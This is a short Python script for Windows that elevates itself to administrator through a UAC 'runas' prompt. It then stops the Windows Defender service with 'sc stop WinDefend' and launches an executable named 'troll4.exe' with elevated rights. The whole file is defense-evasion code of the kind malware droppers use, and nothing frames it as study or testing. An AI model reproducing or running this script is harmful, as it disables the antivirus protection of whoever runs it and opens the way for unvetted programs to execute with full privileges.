import ctypes
import os
import sys


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():
    pass
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                        __file__, None, 1)
    exit()


script_name = "troll4.exe"
script_path = os.path.abspath(script_name)

command = "sc stop WinDefend"
os.system(command)
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                        script_path, None, 1)
